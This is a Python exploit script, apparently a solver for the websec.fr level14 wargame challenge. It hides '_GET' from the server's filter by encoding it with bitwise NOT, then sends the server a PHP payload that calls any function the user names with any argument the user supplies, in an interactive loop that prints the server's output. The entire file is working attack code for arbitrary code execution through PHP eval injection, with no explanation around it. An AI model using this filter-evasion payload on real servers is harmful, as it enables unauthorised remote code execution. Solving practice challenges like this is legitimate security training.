import requests
import re

def obfuscate_to_bitwise_not(input_str):
    result = ''
    for char in input_str:
        not_byte = ~ord(char) & 0xFF  # bitwise NOT and mask to 1 byte
        result += '\\x{:02x}'.format(not_byte)
    return result


def send_request(function_name, function_param, payload):
    URL = "https://websec.fr/level14/index.php"
    params = {
        "0": function_name,
        "1": function_param
    }
    data = {
        "code": payload
    }
    response = requests.post(URL, params=params, data=data)
    html = response.text

    # Extract content inside <pre>...</pre>
    match = re.search(r"<pre>(.*?)</pre>", html, re.DOTALL)
    if match:
        content = match.group(1)
        print("✅ Output from server:\n")
        print(content.strip())
    else:
        print("❌ No <pre> block found.")


# Infinite loop to allow the user to enter function_name and function_param
while True:
    # Get user input for function name and parameter
    function_name = input("Enter the function name (or type 'exit' to quit): ")
    if function_name.lower() == 'exit':
        break  # Exit the loop if the user types 'exit'

    function_param = input("Enter the function parameter: ")

    # Obfuscate the payload with the user inputs
    GET_encoded = obfuscate_to_bitwise_not("_GET")
    payload_str = f"${{~{GET_encoded}}}{{0}}(${{~{GET_encoded}}}{{1}});"
    payload = bytes(payload_str, "utf-8").decode("unicode_escape").encode("latin1")
    print(f"Payload: {payload}")

    # Send the request and print the result
    send_request(function_name, function_param, payload)
